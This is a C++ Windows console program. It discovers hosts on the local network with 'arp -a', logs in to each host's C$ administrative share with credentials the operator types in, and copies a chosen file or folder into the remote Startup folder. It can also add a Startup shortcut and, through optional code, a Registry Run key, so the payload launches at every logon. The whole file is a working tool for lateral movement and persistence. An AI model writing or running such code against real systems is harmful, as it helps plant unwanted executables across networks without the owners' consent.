#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <filesystem>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <array>
#include <sstream>
#include <shlwapi.h>
#include <commdlg.h>
#include <winnetwk.h>
#include <vector>
#include <shlobj.h>
#include <objbase.h>
#include <objidl.h>
#include <shobjidl.h>

#pragma comment(lib, "Comdlg32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Mpr.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Ole32.lib")

bool needToAddToReg = false;

std::wstring GetFileNameWithoutExtension(const std::wstring& fullPath) {
    std::wstring fileName = PathFindFileNameW(fullPath.c_str());
    size_t dotPos = fileName.find_last_of(L'.');
    if (dotPos != std::wstring::npos) {
        return fileName.substr(0, dotPos);
    }
    return fileName;
}

bool AddToRemoteRegistryRun(const std::wstring& remoteName, const std::wstring& name, const std::wstring& path) {
    HKEY hRemoteReg;
    std::wstring computerName = L"\\\\" + remoteName;

    LONG result = RegConnectRegistryW(computerName.c_str(), HKEY_CURRENT_USER, &hRemoteReg);
    if (result != ERROR_SUCCESS) {
        std::wcerr << L"Failed to connect to registry. Error: " << result << std::endl;
        return false;
    }

    HKEY hKey;
    result = RegOpenKeyExW(hRemoteReg, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    if (result != ERROR_SUCCESS) {
        RegCloseKey(hRemoteReg);
        std::wcerr << L"Failed to open Run key. Error: " << result << std::endl;
        return false;
    }

    result = RegSetValueExW(hKey, name.c_str(), 0, REG_SZ,
        reinterpret_cast<const BYTE*>(path.c_str()),
        static_cast<DWORD>((path.size() + 1) * sizeof(wchar_t)));

    RegCloseKey(hKey);
    RegCloseKey(hRemoteReg);

    if (result == ERROR_SUCCESS) {
        std::wcout << L"Successfully added to remote registry!" << std::endl;
        return true;
    }

    std::wcerr << L"Failed to set registry value. Error: " << result << std::endl;
    return false;
}

void createFile() {
    std::array<char, 128> buffer;
    std::string result;

    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen("arp -a", "r"), _pclose);
    if (!pipe) {
        throw std::runtime_error("_popen() failed!");
    }

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }

    std::istringstream iss(result);
    std::string line;

    std::ofstream IPs("IP Adress.txt");

    if (IPs.is_open()) {
        while (std::getline(iss, line)) {
            if (line.find("dynamic") != std::string::npos) {
                line.erase(0, 2);
                size_t pos = line.find(' ');
                if (pos != std::string::npos) {
                    line.erase(pos);
                }
                std::cout << line << std::endl;
                IPs << line << "\n";
            }
        }
    }
    else {
        std::cerr << "failed to open file\n";
    }

    IPs.close();
}

struct PathData {
    std::wstring fullPath;
    std::wstring name;
    bool isDirectory;
    std::vector<std::wstring> contents;
};

void showDirectoryContents(const std::wstring& path) {
    std::wcout << L"\nDirectory contents:\n";
    std::wcout << L"------------------\n";
    for (const auto& entry : std::filesystem::directory_iterator(path)) {
        std::wcout << L"- " << entry.path().filename().wstring();
        if (entry.is_directory()) {
            std::wcout << L" (Folder)";
        }
        std::wcout << std::endl;
    }
    std::wcout << L"------------------\n\n";
}

PathData selectPath() {
    PathData data;
    BROWSEINFOW bi = { 0 };
    bi.lpszTitle = L"Select a file or folder";
    bi.ulFlags = BIF_RETURNONLYFSDIRS | BIF_BROWSEINCLUDEFILES;

    LPITEMIDLIST pidl = SHBrowseForFolderW(&bi);
    if (pidl != nullptr) {
        wchar_t path[MAX_PATH];
        SHGetPathFromIDListW(pidl, path);
        CoTaskMemFree(pidl);

        data.fullPath = path;
        data.name = PathFindFileNameW(path);
        data.isDirectory = std::filesystem::is_directory(path);

        std::wcout << L"[+] Selected path >> " << data.fullPath << std::endl;
        std::wcout << L"[+] Type >> " << (data.isDirectory ? L"Directory" : L"File") << std::endl;

        if (data.isDirectory) {
            showDirectoryContents(data.fullPath);
        }
    }
    else {
        std::wcout << L"Canceled." << std::endl;
    }

    return data;
}

bool createShortcut(const std::wstring& targetPath, const std::wstring& shortcutPath, const std::wstring& workingDir = L"") {
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) {
        std::wcerr << L"Failed to initialize COM" << std::endl;
        return false;
    }

    IShellLinkW* pShellLink = NULL;
    hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (LPVOID*)&pShellLink);
    if (FAILED(hr)) {
        std::wcerr << L"Failed to create ShellLink instance" << std::endl;
        CoUninitialize();
        return false;
    }

    hr = pShellLink->SetPath(targetPath.c_str());
    if (FAILED(hr)) {
        std::wcerr << L"Failed to set shortcut target" << std::endl;
        pShellLink->Release();
        CoUninitialize();
        return false;
    }

    if (!workingDir.empty()) {
        hr = pShellLink->SetWorkingDirectory(workingDir.c_str());
        if (FAILED(hr)) {
            std::wcerr << L"Failed to set working directory" << std::endl;
            pShellLink->Release();
            CoUninitialize();
            return false;
        }
    }

    IPersistFile* pPersistFile = NULL;
    hr = pShellLink->QueryInterface(IID_IPersistFile, (LPVOID*)&pPersistFile);
    if (FAILED(hr)) {
        std::wcerr << L"Failed to get PersistFile interface" << std::endl;
        pShellLink->Release();
        CoUninitialize();
        return false;
    }

    hr = pPersistFile->Save(shortcutPath.c_str(), TRUE);
    pPersistFile->Release();
    pShellLink->Release();
    CoUninitialize();

    return SUCCEEDED(hr);
}

void deleteFile(const std::wstring& fileName) {
    if (DeleteFileW(fileName.c_str())) {
        std::wcout << L"FILE DELETED\n";
    }
    else {
        DWORD lastError = GetLastError();
        std::wcerr << L"ERROR: " << lastError << std::endl;
    }
}

bool copyDirectory(const std::wstring& source, const std::wstring& destination) {
    try {
        std::filesystem::create_directories(destination);
        for (const auto& entry : std::filesystem::directory_iterator(source)) {
            const auto& path = entry.path();
            auto newPath = destination + L"\\" + path.filename().wstring();
            if (entry.is_directory()) {
                if (!copyDirectory(path.wstring(), newPath)) {
                    return false;
                }
            }
            else {
                if (!CopyFileW(path.wstring().c_str(), newPath.c_str(), FALSE)) {
                    std::wcerr << L"Failed to copy file: " << path << L" to " << newPath << std::endl;
                    return false;
                }
            }
        }
        return true;
    }
    catch (const std::exception& e) {
        std::cerr << "Error copying directory: " << e.what() << std::endl;
        return false;
    }
}

std::wstring selectFileFromDirectory(const std::wstring& directory) {
    std::vector<std::wstring> files;

    for (const auto& entry : std::filesystem::directory_iterator(directory)) {
        files.push_back(entry.path().filename().wstring());
    }

    if (files.empty()) {
        std::wcout << L"No files found in the directory.\n";
        return L"";
    }

    std::wcout << L"\nAvailable files:\n";
    for (size_t i = 0; i < files.size(); ++i) {
        std::wcout << i + 1 << L". " << files[i] << std::endl;
    }

    int choice = 0;
    do {
        std::wcout << L"Select a file to create shortcut (1-" << files.size() << L") or 0 to skip: ";
        std::wcin >> choice;
        std::wcin.ignore();
    } while (choice < 0 || choice > files.size());

    if (choice == 0) {
        return L"";
    }

    return files[choice - 1];
}

bool askCreateShortcut(const std::wstring& filePath, std::wstring& shortcutFolder, const std::wstring& username) {
    std::wcout << L"Do you want to create a shortcut to " << PathFindFileNameW(filePath.c_str()) << L"? (y/n): ";
    wchar_t answer;
    std::wcin >> answer;
    std::wcin.ignore();

    if (answer != L'y' && answer != L'Y') {
        return false;
    }

    shortcutFolder = L"ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
    std::wcout << L"Shortcut will be created in remote user's Startup folder: " << shortcutFolder << std::endl;

    return true;
}

int main() {
    createFile();

    system("pause");

    std::ifstream IPs("IP Adress.txt");
    std::vector<std::string> Adreses;

    if (IPs.is_open()) {
        std::string line;
        while (std::getline(IPs, line)) {
            Adreses.push_back(line);
        }
        IPs.close();
    }
    else {
        std::cerr << "Failed to open IP Adress.txt\n";
        system("pause");
        deleteFile(L"IP Adress.txt");
        return 1;
    }

    PathData pathData = selectPath();
    if (pathData.fullPath.empty()) {
        std::wcout << L"[!] Path is not selected.\n";
        system("pause");
        deleteFile(L"IP Adress.txt");
        return 0;
    }

    std::wstring username, password;
    std::wcout << L"[?] Username (for remote PC) >> ";
    std::wcin >> username;
    std::wcout << L"[?] Password (Press ENTER if haven't) >> ";
    std::wcin.ignore();
    std::getline(std::wcin, password);

    std::wstring shortcutTarget;
    bool createShortcutFlag = false;
    std::wstring shortcutFolder;

    if (pathData.isDirectory) {
        std::wstring selectedFile = selectFileFromDirectory(pathData.fullPath);
        if (!selectedFile.empty()) {
            std::wstring fullPath = pathData.fullPath + L"\\" + selectedFile;
            createShortcutFlag = askCreateShortcut(fullPath, shortcutFolder, username);
            if (createShortcutFlag) {
                shortcutTarget = selectedFile;
            }
        }
    }
    else {
        createShortcutFlag = askCreateShortcut(pathData.fullPath, shortcutFolder, username);
        if (createShortcutFlag) {
            shortcutTarget = pathData.name;
        }
    }

    std::wstring folderName;
    std::wcout << L"[?] Target folder on C$ (default >> 'Startup') >> ";
    std::getline(std::wcin, folderName);

    std::cout << "\n\n";

    if (folderName.empty()) {
        folderName = L"ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
    }

    // Формуємо робочу папку для ярлика
    std::wstring workingDir = L"C:\\" + folderName;
    if (pathData.isDirectory) {
        workingDir += L"\\" + pathData.name;
    }

    for (auto& a : Adreses) {
        std::wstring remoteIp(a.begin(), a.end());
        std::wstring remoteUNC = L"\\\\" + remoteIp + L"\\C$";
        std::wstring remotePath = remoteUNC + L"\\" + folderName;

        std::wcout << remoteIp << L":\n";

        NETRESOURCE nr;
        ZeroMemory(&nr, sizeof(nr));
        nr.dwType = RESOURCETYPE_DISK;
        nr.lpRemoteName = const_cast<LPWSTR>(remoteUNC.c_str());

        DWORD result = WNetAddConnection2W(&nr, password.c_str(), username.c_str(), 0);
        if (result != NO_ERROR) {
            std::wcerr << L"\t[!] Failed to connect. Error >> " << result << std::endl;
            if (result == 1326) std::wcerr << L"Incorrect login or password\n";
            continue;
        }

        if (pathData.isDirectory) {
            std::wstring targetPath = remotePath + L"\\" + pathData.name;
            if (copyDirectory(pathData.fullPath, targetPath)) {
                std::wcout << L"\t[+] Directory successfully copied to >> " << targetPath << std::endl;

                if (createShortcutFlag) {
                    std::wstring shortcutSource = L"C:\\" + folderName + L"\\" + pathData.name + L"\\" + shortcutTarget;
                    std::wstring shortcutDest = remoteUNC + L"\\" + shortcutFolder + L"\\" +
                        GetFileNameWithoutExtension(shortcutTarget) + L".lnk";

                    if (createShortcut(shortcutSource, shortcutDest, workingDir)) {
                        std::wcout << L"\t[+] Shortcut created at: " << shortcutDest << std::endl;
                        std::wcout << L"\t[+] Working directory: " << workingDir << std::endl;
                    }
                    else {
                        std::wcerr << L"\t[!] Failed to create shortcut" << std::endl;
                    }
                }

                if (needToAddToReg) {
                    std::wcout << L"Attempting to add to remote registry...\n";
                    for (const auto& entry : std::filesystem::directory_iterator(pathData.fullPath)) {
                        if (entry.path().extension() == L".exe") {
                            std::wstring remoteExePath = L"C:\\" + folderName + L"\\" + pathData.name + L"\\" + entry.path().filename().wstring();
                            AddToRemoteRegistryRun(remoteIp, entry.path().filename().wstring(), remoteExePath);
                        }
                    }
                }
            }
            else {
                std::wcerr << L"\t[!] Failed to copy directory\n";
            }
        }
        else {
            std::wstring targetPath = remotePath + L"\\" + pathData.name;
            if (CreateDirectoryW(remotePath.c_str(), NULL)) {
                std::wcerr << L"\t[+] Directory created" << std::endl;
            }
            else {
                DWORD err = GetLastError();
                if (err != ERROR_ALREADY_EXISTS) {
                    std::wcerr << L"\t[!] Failed to create directory. Error code >> " << err << std::endl;
                    continue;
                }
            }

            if (CopyFileW(pathData.fullPath.c_str(), targetPath.c_str(), FALSE)) {
                std::wcout << L"\t[+] File successfully copied to >> " << targetPath << std::endl;

                if (createShortcutFlag) {
                    std::wstring shortcutSource = L"C:\\" + folderName + L"\\" + pathData.name;
                    std::wstring shortcutDest = remoteUNC + L"\\" + shortcutFolder + L"\\" +
                        GetFileNameWithoutExtension(pathData.name) + L".lnk";

                    if (createShortcut(shortcutSource, shortcutDest, workingDir)) {
                        std::wcout << L"\t[+] Shortcut created at: " << shortcutDest << std::endl;
                        std::wcout << L"\t[+] Working directory: " << workingDir << std::endl;
                    }
                    else {
                        std::wcerr << L"\t[!] Failed to create shortcut" << std::endl;
                    }
                }

                if (needToAddToReg && pathData.name.substr(pathData.name.find_last_of('.')) == L".exe") {
                    std::wcout << L"Attempting to add to remote registry...\n";
                    std::wstring remotePathWithDrive = L"C:\\" + folderName + L"\\" + pathData.name;
                    AddToRemoteRegistryRun(remoteIp, pathData.name, remotePathWithDrive);
                }
            }
            else {
                DWORD err = GetLastError();
                std::wcerr << L"\t[!] Copy failed. Error code >> " << err << std::endl;
            }
        }

        std::cout << "\n\n";
        WNetCancelConnection2W(remoteUNC.c_str(), 0, TRUE);
    }

    system("pause");
    deleteFile(L"IP Adress.txt");

    return 0;
}